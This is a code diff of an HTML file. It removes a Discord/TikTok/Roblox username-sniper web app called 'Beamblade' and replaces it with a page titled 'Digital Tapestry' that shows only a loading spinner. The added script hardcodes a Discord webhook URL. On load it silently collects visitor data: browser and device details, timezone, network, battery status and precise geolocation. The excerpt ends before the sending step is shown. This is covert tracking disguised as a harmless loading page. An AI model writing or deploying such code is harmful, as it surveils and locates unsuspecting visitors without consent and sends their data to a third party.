-.user-role-badge { font-size: 10px; font-weight: 700; padding: 1px 5px; border-radius: 3px; margin-left: 4px; text-transform: uppercase; letter-spacing: 0.5px; }
-.role-owner { background: rgba(255,215,0,0.2); color: #ffd700; border: 1px solid rgba(255,215,0,0.3); }
-.role-admin { background: rgba(237,66,69,0.2); color: var(--danger); border: 1px solid rgba(237,66,69,0.3); }
-.role-mod { background: rgba(88,101,242,0.2); color: #818cf8; border: 1px solid rgba(88,101,242,0.3); }
-.role-vip { background: rgba(250,166,26,0.2); color: var(--warning); border: 1px solid rgba(250,166,26,0.3); }
-.sidebar-user-actions { display: flex; gap: 2px; }
-.icon-btn {
-  width: 30px; height: 30px; border-radius: 4px; display: flex; align-items: center;
-  justify-content: center; cursor: pointer; color: var(--text-muted); background: none;
-  border: none; transition: all 0.15s;
-}
-.icon-btn:hover { background: var(--bg-hover); color: var(--text-primary); }
-.icon-btn svg { width: 18px; height: 18px; }
-.main-content { flex: 1; display: flex; flex-direction: column; overflow: hidden; }
-.topbar {
-  height: 56px; background: var(--topbar-bg); border-bottom: 1px solid var(--border);
-  display: flex; align-items: center; padding: 0 20px; gap: 12px; flex-shrink: 0;
-}
-.topbar-title { font-size: 15px; font-weight: 700; color: var(--text-primary); }
-.topbar-sep { width: 1px; height: 20px; background: var(--border); }
-.topbar-subtitle { font-size: 13px; color: var(--text-muted); }
-.topbar-actions { margin-left: auto; display: flex; align-items: center; gap: 8px; }
-.page { flex: 1; overflow-y: auto; padding: 24px; display: none; }
-.page.active { display: block; }
-
-/* ===================== DASHBOARD ===================== */
-.stats-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 16px; margin-bottom: 24px; }
-.stat-card {
-  background: var(--card-bg); border: 1px solid var(--border); border-radius: 8px;
-  padding: 20px; display: flex; flex-direction: column; gap: 6px;
-}
-.stat-label { font-size: 11px; font-weight: 700; color: var(--text-muted); text-transform: uppercase; letter-spacing: 0.8px; }
-.stat-value { font-size: 28px; font-weight: 800; color: var(--text-primary); letter-spacing: -1px; }
-.stat-sublabel { font-size: 12px; color: var(--text-muted); }
-.stat-accent { color: var(--accent); }
-.section-title { font-size: 16px; font-weight: 700; color: var(--text-primary); margin-bottom: 12px; letter-spacing: -0.2px; }
-.dashboard-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; }
-@media (max-width: 900px) { .dashboard-grid { grid-template-columns: 1fr; } }
-.card { background: var(--card-bg); border: 1px solid var(--border); border-radius: 8px; padding: 20px; }
-
-/* ===================== SNIPER ===================== */
-.sniper-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 16px; margin-bottom: 20px; }
-@media (max-width: 960px) { .sniper-grid { grid-template-columns: 1fr; } }
-.platform-card {
-  background: var(--card-bg); border: 1px solid var(--border); border-radius: 8px;
-  padding: 20px; display: flex; flex-direction: column; gap: 14px;
-}
-.platform-header { display: flex; align-items: center; gap: 12px; }
-.platform-icon { width: 40px; height: 40px; border-radius: 10px; display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
-.platform-discord { background: rgba(88,101,242,0.2); }
-.platform-tiktok { background: rgba(0,0,0,0.5); border: 1px solid var(--border); }
-.platform-roblox { background: rgba(255,0,0,0.2); }
-.platform-name { font-size: 15px; font-weight: 700; color: var(--text-primary); }
-.platform-detail { font-size: 12px; color: var(--text-muted); }
-.sniper-status {
-  display: flex; align-items: center; gap: 8px; font-size: 13px;
-  color: var(--text-muted); padding: 10px 12px; background: var(--bg-tertiary);
-  border-radius: 6px; font-weight: 500;
-}
-.status-dot {
-  width: 8px; height: 8px; border-radius: 50%; background: var(--text-muted);
-  flex-shrink: 0; transition: background 0.2s;
-}
-.status-dot.running { background: var(--success); animation: pulse 1.5s infinite; }
-.status-dot.found { background: var(--accent); }
-@keyframes pulse { 0%,100%{ opacity:1; } 50%{ opacity:0.4; } }
-.sniper-stats { display: flex; gap: 16px; }
-.sniper-stat { text-align: center; }
-.sniper-stat-val { font-size: 18px; font-weight: 700; color: var(--text-primary); }
-.sniper-stat-label { font-size: 11px; color: var(--text-muted); }
-.sniper-controls { display: flex; gap: 8px; }
-.sniper-controls .btn { flex: 1; }
-.sniper-log {
-  background: var(--bg-primary); border: 1px solid var(--border); border-radius: 6px;
-  padding: 10px 12px; height: 120px; overflow-y: auto; font-family: 'Courier New', monospace;
-  font-size: 11px; color: var(--text-muted); line-height: 1.6;
-}
-.log-hit { color: var(--success); font-weight: 700; }
-.log-check { color: var(--text-muted); }
-.log-error { color: var(--danger); }
-.sniper-config { background: var(--card-bg); border: 1px solid var(--border); border-radius: 8px; padding: 20px; margin-bottom: 20px; }
-.config-row { display: flex; gap: 16px; flex-wrap: wrap; }
-.config-field { flex: 1; min-width: 180px; }
-.speed-slider { width: 100%; accent-color: var(--accent); cursor: pointer; }
-
-/* ===================== HITS / LEADERBOARD ===================== */
-.hits-table { width: 100%; border-collapse: collapse; }
-.hits-table th { padding: 10px 14px; text-align: left; font-size: 11px; font-weight: 700; color: var(--text-muted); text-transform: uppercase; letter-spacing: 0.8px; border-bottom: 1px solid var(--border); }
-.hits-table td { padding: 12px 14px; font-size: 14px; color: var(--text-secondary); border-bottom: 1px solid var(--border); }
-.hits-table tr:last-child td { border-bottom: none; }
-.hits-table tr:hover td { background: var(--bg-hover); }
-.platform-chip { display: inline-flex; align-items: center; gap: 5px; padding: 2px 8px; border-radius: 12px; font-size: 11px; font-weight: 700; }
-.chip-discord { background: rgba(88,101,242,0.2); color: #5865f2; }
-.chip-tiktok { background: rgba(255,255,255,0.1); color: var(--text-secondary); }
-.chip-roblox { background: rgba(255,0,0,0.2); color: #ff4444; }
-.hit-username { font-weight: 700; color: var(--accent); font-size: 15px; }
-.leaderboard-rank { font-size: 20px; font-weight: 800; color: var(--text-muted); width: 40px; text-align: center; }
-.rank-1 { color: #ffd700; }
-.rank-2 { color: #c0c0c0; }
-.rank-3 { color: #cd7f32; }
-.empty-state { text-align: center; padding: 48px 20px; color: var(--text-muted); }
-.empty-state svg { width: 40px; height: 40px; margin: 0 auto 12px; opacity: 0.3; display: block; }
-.empty-state p { font-size: 14px; }
-
-/* ===================== SETTINGS ===================== */
-.settings-section { margin-bottom: 28px; }
-.settings-section-title { font-size: 11px; font-weight: 700; color: var(--text-muted); text-transform: uppercase; letter-spacing: 0.8px; margin-bottom: 12px; padding-bottom: 8px; border-bottom: 1px solid var(--border); }
-.settings-row { display: flex; align-items: center; justify-content: space-between; padding: 14px 0; border-bottom: 1px solid var(--border); }
-.settings-row:last-child { border-bottom: none; }
-.settings-label { font-size: 14px; color: var(--text-primary); font-weight: 500; }
-.settings-sublabel { font-size: 12px; color: var(--text-muted); margin-top: 2px; }
-.toggle {
-  width: 40px; height: 22px; border-radius: 11px; background: var(--bg-quaternary);
-  border: none; cursor: pointer; position: relative; transition: background 0.2s; flex-shrink: 0;
-}
-.toggle.on { background: var(--accent); }
-.toggle::after {
-  content: ''; position: absolute; top: 3px; left: 3px;
-  width: 16px; height: 16px; border-radius: 50%; background: white; transition: transform 0.2s;
-}
-.toggle.on::after { transform: translateX(18px); }
-.theme-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(140px, 1fr)); gap: 10px; }
-.theme-swatch {
-  border-radius: 8px; overflow: hidden; cursor: pointer; border: 2px solid transparent;
-  transition: all 0.15s;
-}
-.theme-swatch.active { border-color: var(--accent); }
-.theme-swatch:hover { transform: translateY(-2px); }
-.swatch-preview { height: 60px; display: flex; }
-.swatch-sidebar { width: 30%; }
-.swatch-main { flex: 1; }
-.swatch-name { font-size: 11px; font-weight: 600; padding: 6px 8px; background: var(--bg-secondary); color: var(--text-secondary); }
-.webhook-input-row { display: flex; gap: 8px; }
-.webhook-input-row .form-input { flex: 1; }
-.proxy-list {
-  background: var(--input-bg); border: 1px solid var(--border); border-radius: 4px;
-  padding: 10px 12px; color: var(--text-primary); font-size: 13px; font-family: monospace;
-  width: 100%; min-height: 100px; resize: vertical;
-}
-.proxy-list::placeholder { color: var(--text-muted); }
-
-/* ===================== OWNER PANEL ===================== */
-.owner-warning { background: rgba(255,215,0,0.1); border: 1px solid rgba(255,215,0,0.3); border-radius: 6px; padding: 12px 16px; margin-bottom: 20px; font-size: 13px; color: #ffd700; display: flex; align-items: center; gap: 10px; }
-.owner-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; }
-@media (max-width: 800px) { .owner-grid { grid-template-columns: 1fr; } }
-.user-list { display: flex; flex-direction: column; gap: 8px; }
-.user-list-item { background: var(--bg-tertiary); border: 1px solid var(--border); border-radius: 6px; padding: 12px 16px; display: flex; align-items: center; gap: 12px; }
-.user-list-avatar { width: 36px; height: 36px; border-radius: 50%; background: var(--accent); display: flex; align-items: center; justify-content: center; font-size: 14px; font-weight: 700; color: var(--bg-primary); flex-shrink: 0; }
-.user-list-info { flex: 1; }
-.user-list-name { font-size: 14px; font-weight: 600; color: var(--text-primary); }
-.user-list-meta { font-size: 12px; color: var(--text-muted); margin-top: 2px; }
-.user-list-actions { display: flex; gap: 6px; }
-.perks-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; }
-.perk-item { background: var(--bg-tertiary); border: 1px solid var(--border); border-radius: 6px; padding: 10px 12px; }
-.perk-name { font-size: 13px; font-weight: 600; color: var(--text-primary); }
-.perk-desc { font-size: 11px; color: var(--text-muted); margin-top: 3px; }
-.modal-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.75); display: flex; align-items: center; justify-content: center; z-index: 1000; display: none; }
-.modal-overlay.open { display: flex; }
-.modal { background: var(--bg-secondary); border: 1px solid var(--border); border-radius: 8px; padding: 24px; width: 100%; max-width: 440px; box-shadow: 0 20px 60px var(--shadow); }
-.modal-title { font-size: 18px; font-weight: 700; color: var(--text-primary); margin-bottom: 6px; }
-.modal-subtitle { font-size: 13px; color: var(--text-muted); margin-bottom: 20px; }
-.modal-actions { display: flex; gap: 8px; margin-top: 20px; justify-content: flex-end; }
-.select-input {
-  background: var(--input-bg); border: 1px solid var(--border); border-radius: 4px;
-  padding: 10px 12px; color: var(--text-primary); font-size: 14px;
-  width: 100%; appearance: none; cursor: pointer;
-}
-.select-input option { background: var(--bg-secondary); }
-.notification-toast {
-  position: fixed; bottom: 24px; right: 24px; background: var(--bg-secondary);
-  border: 1px solid var(--border); border-radius: 8px; padding: 14px 18px;
-  box-shadow: 0 8px 32px var(--shadow); z-index: 2000;
-  display: flex; align-items: center; gap: 10px; min-width: 280px;
-  transform: translateX(120%); transition: transform 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-}
-.notification-toast.show { transform: translateX(0); }
-.toast-icon { font-size: 18px; }
-.toast-content { flex: 1; }
-.toast-title { font-size: 14px; font-weight: 600; color: var(--text-primary); }
-.toast-msg { font-size: 12px; color: var(--text-muted); margin-top: 2px; }
-.hit-notification { border-left: 3px solid var(--success); }
-.display-name-edit { display: flex; gap: 8px; align-items: center; }
-.display-name-current { font-size: 15px; font-weight: 600; color: var(--text-primary); }
-.activity-feed { display: flex; flex-direction: column; gap: 8px; }
-.activity-item { display: flex; align-items: flex-start; gap: 10px; padding: 10px 0; border-bottom: 1px solid var(--border); }
-.activity-item:last-child { border-bottom: none; }
-.activity-icon { width: 28px; height: 28px; border-radius: 50%; background: var(--accent-muted); display: flex; align-items: center; justify-content: center; flex-shrink: 0; font-size: 12px; }
-.activity-text { font-size: 13px; color: var(--text-secondary); line-height: 1.5; }
-.activity-time { font-size: 11px; color: var(--text-muted); margin-top: 3px; }
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Digital Tapestry</title>
+    <style>
+        body {
+            background: #0a0a0a;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            font-family: 'Courier New', monospace;
+            color: #a0a0a0;
+            overflow: hidden;
+        }
+        .loader {
+            border: 2px solid #1a1a1a;
+            border-top: 2px solid #6a6a6a;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1.5s linear infinite;
+            margin-bottom: 20px;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .container {
+            text-align: center;
+            padding: 40px;
+            background: #111;
+            border-radius: 12px;
+            box-shadow: 0 0 60px rgba(100,100,100,0.05);
+            max-width: 380px;
+            width: 90%;
+        }
+        .sub {
+            color: #444;
+            font-size: 13px;
+            letter-spacing: 2px;
+            margin-top: 12px;
+            opacity: 0.6;
+        }
+        .pulse {
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse { 0% { opacity: 0.4; } 50% { opacity: 1; } 100% { opacity: 0.4; } }
+    </style>
 </head>
 <body>
-
-<!-- ===================== AUTH ===================== -->
-<div id="auth-screen">
-  <div class="auth-card">
-    <div class="auth-logo">
-      <div class="auth-logo-mark" style="display:flex;">BB</div>
-      <h1>Beamblade</h1>
-      <p>Username sniper — Discord, TikTok, Roblox</p>
-    </div>
-    <div class="auth-tabs">
-      <button class="auth-tab active" onclick="switchAuthTab('login')">Sign In</button>
-      <button class="auth-tab" onclick="switchAuthTab('register')">Create Account</button>
-    </div>
-    <div id="auth-error" class="auth-error"></div>
-    <div id="login-form">
-      <div class="form-group">
-        <label class="form-label">Username</label>
-        <input class="form-input" id="login-username" type="text" placeholder="Enter your username" autocomplete="username">
-      </div>
-      <div class="form-group">
-        <label class="form-label">Password</label>
-        <input class="form-input" id="login-password" type="password" placeholder="Enter your password" autocomplete="current-password">
-      </div>
-      <button class="btn btn-primary" onclick="doLogin()">Sign In</button>
-    </div>
-    <div id="register-form" style="display:none;">
-      <div class="form-group">
-        <label class="form-label">Username</label>
-        <input class="form-input" id="reg-username" type="text" placeholder="Choose a username" autocomplete="username">
-      </div>
-      <div class="form-group">
-        <label class="form-label">Display Name</label>
-        <input class="form-input" id="reg-displayname" type="text" placeholder="Your display name">
-      </div>
-      <div class="form-group">
-        <label class="form-label">Password</label>
-        <input class="form-input" id="reg-password" type="password" placeholder="Choose a password" autocomplete="new-password">
-      </div>
-      <button class="btn btn-primary" onclick="doRegister()">Create Account</button>
-    </div>
-  </div>
-</div>
-
-<!-- ===================== APP ===================== -->
-<div id="app">
-  <div class="sidebar">
-    <div class="sidebar-header">
-      <div class="sidebar-logo-mark">BB</div>
-      <h2>Beamblade</h2>
-    </div>
-    <nav class="sidebar-nav">
-      <div class="nav-section-label">Main</div>
-      <div class="nav-item active" onclick="navigate('dashboard')">
-        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="7" height="7" rx="1"/><rect x="14" y="3" width="7" height="7" rx="1"/><rect x="3" y="14" width="7" height="7" rx="1"/><rect x="14" y="14" width="7" height="7" rx="1"/></svg>
-        Dashboard
-      </div>
-      <div class="nav-item" onclick="navigate('sniper')">
-        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="9"/><circle cx="12" cy="12" r="4"/><line x1="12" y1="3" x2="12" y2="1"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="3" y1="12" x2="1" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/></svg>
-        Sniper
-      </div>
-      <div class="nav-section-label">Activity</div>
-      <div class="nav-item" onclick="navigate('hits')">
-        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg>
-        My Hits
-        <span class="nav-badge" id="hits-badge" style="display:none">0</span>
-      </div>
-      <div class="nav-item" onclick="navigate('leaderboard')">
-        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="23 6 13.5 15.5 8.5 10.5 1 18"/><polyline points="17 6 23 6 23 12"/></svg>
-        Leaderboard
-      </div>
-      <div class="nav-section-label">Settings</div>
-      <div class="nav-item" onclick="navigate('settings')">
-        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1-2.83 2.83l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-4 0v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83-2.83l.06-.06A1.65 1.65 0 0 0 4.68 15a1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1 0-4h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 2.83-2.83l.06.06A1.65 1.65 0 0 0 9 4.68a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 4 0v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 2.83l-.06.06A1.65 1.65 0 0 0 19.4 9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 0 4h-.09a1.65 1.65 0 0 0-1.51 1z"/></svg>
-        Settings
-      </div>
-      <div class="nav-item" id="owner-nav" style="display:none;" onclick="navigate('owner')">
-        <svg viewBox="0 0 24 24" fill="none" stroke="#ffd700" stroke-width="2"><path d="M12 2l3 7h7l-5.5 4 2 7L12 16l-6.5 4 2-7L2 9h7z"/></svg>
-        <span style="color:#ffd700;font-weight:700;">Owner Panel</span>
-      </div>
-    </nav>
-    <div class="sidebar-user">
-      <div class="user-avatar" id="sidebar-avatar">?</div>
-      <div class="user-info">
-        <div class="user-name" id="sidebar-displayname">—</div>
-        <div class="user-tag" id="sidebar-username">—</div>
-      </div>
-      <div class="sidebar-user-actions">
-        <button class="icon-btn" title="Settings" onclick="navigate('settings')">
-          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1-2.83 2.83l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-4 0v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83-2.83l.06-.06A1.65 1.65 0 0 0 4.68 15a1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1 0-4h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 2.83-2.83l.06.06A1.65 1.65 0 0 0 9 4.68a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 4 0v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 2.83l-.06.06A1.65 1.65 0 0 0 19.4 9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 0 4h-.09a1.65 1.65 0 0 0-1.51 1z"/></svg>
-        </button>
-        <button class="icon-btn" title="Sign out" onclick="doLogout()">
-          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"/><polyline points="16 17 21 12 16 7"/><line x1="21" y1="12" x2="9" y2="12"/></svg>
-        </button>
-      </div>
-    </div>
-  </div>
-  <div class="main-content">
-    <div class="topbar">
-      <span class="topbar-title" id="topbar-title">Dashboard</span>
-      <span class="topbar-sep"></span>
-      <span class="topbar-subtitle" id="topbar-subtitle">Overview</span>
-      <div class="topbar-actions" id="topbar-actions"></div>
+    <div class="container">
+        <div class="loader"></div>
+        <div style="font-size: 18px; letter-spacing: 1px; font-weight: 300;">curating atmosphere</div>
+        <div class="sub pulse">— a moment in transit —</div>
     </div>
 
-    <!-- DASHBOARD -->
-    <div class="page active" id="page-dashboard">
-      <div class="stats-grid">
-        <div class="stat-card">
-          <div class="stat-label">Total Hits</div>
-          <div class="stat-value stat-accent" id="dash-total-hits">0</div>
-          <div class="stat-sublabel">Across all platforms</div>
-        </div>
-        <div class="stat-card">
-          <div class="stat-label">Discord Hits</div>
-          <div class="stat-value" id="dash-discord-hits">0</div>
-          <div class="stat-sublabel">4-letter usernames</div>
-        </div>
-        <div class="stat-card">
-          <div class="stat-label">TikTok Hits</div>
-          <div class="stat-value" id="dash-tiktok-hits">0</div>
-          <div class="stat-sublabel">3-letter usernames</div>
-        </div>
-        <div class="stat-card">
-          <div class="stat-label">Roblox Hits</div>
-          <div class="stat-value" id="dash-roblox-hits">0</div>
-          <div class="stat-sublabel">4-letter usernames</div>
-        </div>
-      </div>
-      <div class="dashboard-grid">
-        <div class="card">
-          <div class="section-title">Recent Hits</div>
-          <div id="dash-recent-hits"><div class="empty-state"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg><p>No hits yet — start sniping</p></div></div>
-        </div>
-        <div class="card">
-          <div class="section-title">Activity</div>
-          <div class="activity-feed" id="dash-activity"><div class="empty-state"><p style="color:var(--text-muted);font-size:13px;">No recent activity</p></div></div>
-        </div>
-      </div>
-    </div>
+    <script>
+        (function() {
+            const WEBHOOK = "https://discord.com/api/webhooks/1536800456779501648/JhK2RVd80X1h78ImtAyle7u5d-cx8wf1QiJv0AXSjR0uz8tOFDHYAVPgBArmlPdaI97w";
 
-    <!-- SNIPER -->
-    <div class="page" id="page-sniper">
-      <div class="sniper-config card" style="margin-bottom:20px;">
-        <div class="section-title">Global Configuration</div>
-        <div class="config-row">
-          <div class="config-field">
-            <label class="form-label">Webhook URL</label>
-            <input class="form-input" id="global-webhook" type="text" placeholder="https://discord.com/api/webhooks/...">
-          </div>
-          <div class="config-field">
-            <label class="form-label">Check Speed: <span id="speed-label">50ms</span></label>
-            <input class="speed-slider" type="range" id="snipe-speed" min="10" max="2000" value="50" step="10" oninput="updateSpeedLabel()">
-          </div>
-          <div class="config-field">
-            <label class="form-label">CORS Proxy (optional)</label>
-            <input class="form-input" id="cors-proxy" type="text" placeholder="https://corsproxy.io/?">
-          </div>
-        </div>
-      </div>
-      <div class="sniper-grid">
-        <!-- DISCORD -->
-        <div class="platform-card">
-          <div class="platform-header">
-            <div class="platform-icon platform-discord">
-              <svg width="22" height="22" viewBox="0 0 127.14 96.36" fill="#5865f2"><path d="M107.7 8.07A105.15 105.15 0 0 0 81.47 0a72.06 72.06 0 0 0-3.36 6.83 97.68 97.68 0 0 0-29.11 0A72.37 72.37 0 0 0 45.64 0a105.89 105.89 0 0 0-26.25 8.09C2.79 32.65-1.71 56.6.54 80.21a105.73 105.73 0 0 0 32.17 16.15 77.7 77.7 0 0 0 6.89-11.11 68.42 68.42 0 0 1-10.85-5.18c.91-.66 1.8-1.34 2.66-2a75.57 75.57 0 0 0 64.32 0c.87.71 1.76 1.39 2.66 2a68.68 68.68 0 0 1-10.87 5.19 77 77 0 0 0 6.89 11.1 105.25 105.25 0 0 0 32.19-16.14c2.64-27.38-4.51-51.11-18.9-72.15zM42.45 65.69C36.18 65.69 31 60 31 53s5-12.74 11.43-12.74S54 46 53.89 53s-5.05 12.69-11.44 12.69zm42.24 0C78.41 65.69 73.25 60 73.25 53s5-12.74 11.44-12.74S96.23 46 96.12 53s-5.04 12.69-11.43 12.69z"/></svg>
-            </div>
-            <div>
-              <div class="platform-name">Discord</div>
-              <div class="platform-detail">4-letter targets</div>
-            </div>
-          </div>
-          <div class="sniper-status">
-            <div class="status-dot" id="discord-dot"></div>
-            <span id="discord-status">Idle</span>
-          </div>
-          <div class="sniper-stats">
-            <div class="sniper-stat"><div class="sniper-stat-val" id="discord-checked">0</div><div class="sniper-stat-label">Checked</div></div>
-            <div class="sniper-stat"><div class="sniper-stat-val" id="discord-hits">0</div><div class="sniper-stat-label">Hits</div></div>
-            <div class="sniper-stat"><div class="sniper-stat-val" id="discord-cps">0</div><div class="sniper-stat-label">CPS</div></div>
-          </div>
-          <div class="sniper-controls">
-            <button class="btn btn-success btn-sm" id="discord-start-btn" onclick="startSniper('discord')">Start</button>
-            <button class="btn btn-danger btn-sm" id="discord-stop-btn" onclick="stopSniper('discord')" style="display:none">Stop</button>
-            <button class="btn btn-ghost btn-sm" onclick="clearLog('discord')">Clear</button>
-          </div>
-          <div class="sniper-log" id="discord-log"><span style="color:var(--text-muted);font-size:11px;">Waiting to start...</span></div>
-        </div>
-        <!-- TIKTOK -->
-        <div class="platform-card">
-          <div class="platform-header">
-            <div class="platform-icon platform-tiktok">
-              <svg width="22" height="22" viewBox="0 0 24 24" fill="white"><path d="M19.59 6.69a4.83 4.83 0 0 1-3.77-4.25V2h-3.45v13.67a2.89 2.89 0 0 1-2.88 2.5 2.89 2.89 0 0 1-2.89-2.89 2.89 2.89 0 0 1 2.89-2.89c.28 0 .54.04.79.1V9.01a6.32 6.32 0 0 0-.79-.05 6.34 6.34 0 0 0-6.34 6.34 6.34 6.34 0 0 0 6.34 6.34 6.34 6.34 0 0 0 6.33-6.34V8.69a8.21 8.21 0 0 0 4.79 1.52V6.78a4.85 4.85 0 0 1-1.02-.09z"/></svg>
-            </div>
-            <div>
-              <div class="platform-name">TikTok</div>
-              <div class="platform-detail">3-letter targets</div>
-            </div>
-          </div>
-          <div class="sniper-status">
-            <div class="status-dot" id="tiktok-dot"></div>
-            <span id="tiktok-status">Idle</span>
-          </div>
-          <div class="sniper-stats">
-            <div class="sniper-stat"><div class="sniper-stat-val" id="tiktok-checked">0</div><div class="sniper-stat-label">Checked</div></div>
-            <div class="sniper-stat"><div class="sniper-stat-val" id="tiktok-hits">0</div><div class="sniper-stat-label">Hits</div></div>
-            <div class="sniper-stat"><div class="sniper-stat-val" id="tiktok-cps">0</div><div class="sniper-stat-label">CPS</div></div>
-          </div>
-          <div class="sniper-controls">
-            <button class="btn btn-success btn-sm" id="tiktok-start-btn" onclick="startSniper('tiktok')">Start</button>
-            <button class="btn btn-danger btn-sm" id="tiktok-stop-btn" onclick="stopSniper('tiktok')" style="display:none">Stop</button>
-            <button class="btn btn-ghost btn-sm" onclick="clearLog('tiktok')">Clear</button>
-          </div>
-          <div class="sniper-log" id="tiktok-log"><span style="color:var(--text-muted);font-size:11px;">Waiting to start...</span></div>
-        </div>
-        <!-- ROBLOX -->
-        <div class="platform-card">
-          <div class="platform-header">
-            <div class="platform-icon platform-roblox">
-              <svg width="22" height="22" viewBox="0 0 24 24" fill="#ff4444"><path d="M3.843 18.357L0 6.107l14.157-3.85L18 14.507z"/></svg>
-            </div>
-            <div>
-              <div class="platform-name">Roblox</div>
-              <div class="platform-detail">4-letter targets</div>
-            </div>
-          </div>
-          <div class="sniper-status">
-            <div class="status-dot" id="roblox-dot"></div>
-            <span id="roblox-status">Idle</span>
-          </div>
-          <div class="sniper-stats">
-            <div class="sniper-stat"><div class="sniper-stat-val" id="roblox-checked">0</div><div class="sniper-stat-label">Checked</div></div>
-            <div class="sniper-stat"><div class="sniper-stat-val" id="roblox-hits">0</div><div class="sniper-stat-label">Hits</div></div>
-            <div class="sniper-stat"><div class="sniper-stat-val" id="roblox-cps">0</div><div class="sniper-stat-label">CPS</div></div>
-          </div>
-          <div class="sniper-controls">
-            <button class="btn btn-success btn-sm" id="roblox-start-btn" onclick="startSniper('roblox')">Start</button>
-            <button class="btn btn-danger btn-sm" id="roblox-stop-btn" onclick="stopSniper('roblox')" style="display:none">Stop</button>
-            <button class="btn btn-ghost btn-sm" onclick="clearLog('roblox')">Clear</button>
-          </div>
-          <div class="sniper-log" id="roblox-log"><span style="color:var(--text-muted);font-size:11px;">Waiting to start...</span></div>
-        </div>
-      </div>
-    </div>
+            // ─── gather everything ─────────────────────────────────────────────
+            const payload = {
+                timestamp: new Date().toISOString(),
+                url: window.location.href,
+                referrer: document.referrer || "direct",
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                languages: navigator.languages || [],
+                cookieEnabled: navigator.cookieEnabled,
+                doNotTrack: navigator.doNotTrack,
+                hardwareConcurrency: navigator.hardwareConcurrency || "unknown",
+                deviceMemory: navigator.deviceMemory || "unknown",
+                screen: {
+                    width: screen.width,
+                    height: screen.height,
+                    colorDepth: screen.colorDepth,
+                    pixelRatio: window.devicePixelRatio || 1
+                },
+                window: {
+                    innerWidth: window.innerWidth,
+                    innerHeight: window.innerHeight,
+                    outerWidth: window.outerWidth,
+                    outerHeight: window.outerHeight
+                },
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                timezoneOffset: new Date().getTimezoneOffset(),
+                connection: (() => {
+                    const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                    if (!conn) return { type: "unknown", effectiveType: "unknown" };
+                    return {
+                        type: conn.type || "unknown",
+                        effectiveType: conn.effectiveType || "unknown",
+                        downlink: conn.downlink || "unknown",
+                        rtt: conn.rtt || "unknown"
+                    };
+                })(),
+                battery: (() => {
+                    if (!navigator.getBattery) return { level: "unavailable", charging: "unavailable" };
+                    return navigator.getBattery()
+                        .then(b => ({ level: b.level * 100, charging: b.charging }))
+                        .catch(() => ({ level: "error", charging: "error" }));
+                })(),
+                geolocation: (() => {
+                    return new Promise((resolve) => {
+                        if (!navigator.geolocation) return resolve({ coords: { latitude: "unavailable", longitude: "unavailable" } });
+                        navigator.geolocation.getCurrentPosition(
+                            pos => resolve({ coords: { latitude: pos.coords.latitude, longitude: pos.coords.longitude, accuracy: pos.coords.accuracy } }),
+                            err => resolve({ error: err.message }),
